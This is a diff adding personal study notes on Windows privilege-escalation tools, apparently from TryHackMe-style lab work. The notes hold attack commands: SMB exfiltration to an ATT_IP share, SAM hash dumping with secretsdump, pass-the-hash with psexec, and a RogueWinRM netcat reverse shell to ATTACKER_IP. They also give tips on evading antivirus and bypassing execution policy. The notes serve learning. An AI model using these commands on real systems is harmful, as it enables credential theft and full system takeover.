@@ -1,0 +1,67 @@
+**SysInternals**
+
+**AccessChk**
+an exe file from the SysInternals tool for checking permissions for objects in windows
+who have permissions and what permission 
+accesschk.exe [-flag] [file or user or directory etc]
+{
+
+}
+
+**Impacket**
+  **smbserver** to communicate with windows victim => python3 /usr/share/doc/python3- 
+  impacket/examples/smbserver.py -smb2support -username[ example] -password [password] public 
+  share [example folders like public/share]
+
+  victim connects with : copy [path to file] \\[ATT_IP]\public\ -> copy makes a copy of the file and then it 
+  connects and pass it to the share then we can take the file with our attacking machine
+
+  **SecretDump** - after taking a sam copy or a domain controller  from a windows machine secretdump 
+  will find the passwords in it 
+
+  example: python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system 
+ system.hive LOCAL
+ {didnt fil with examples cause we will use this on those kind of files}
+
+  **psexec**
+  psexec one of his uses is to pass the hash that we got with secretdump and smbserver 
+  python3.9 /opt/impacket/examples/psexec.py -hashes 
+  aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 
+  administrator@10.10.195.207
+
+**RogueWinRM**
+RogueWinRM used when a user have remote access with WinRM but cant use direct commands (restricted enviroments)
+its helps attacker gets a shell 
+send commands remotly with WinRM
+pass restrictions of WinRM
+
+whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.
+
+If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.
+
+c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
+
+**wmic**
+wmic product get name,version,vendor - wmic tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software (it might take around a minute to finish)
+
+**WinPeas**
+WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths (seems to be linpeas of windows)
+ winpeas.exe > outputfile.txt
+
+**PrivescCheck**
+PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.
+Reminder: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the Set-ExecutionPolicy cmdlet as shown below.
+
+Powershell
+PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
+PS C:\> . .\PrivescCheck.ps1
+PS C:\> Invoke-PrivescCheck
+
+**WES_NG**
+WES-NG: Windows Exploit Suggester - Next Generation
+Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).
+To use the script, you will need to run the systeminfo command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.
+
+Once this is done, wes.py can be run as follow:
+
+user@kali$ wes.py systeminfo.txt
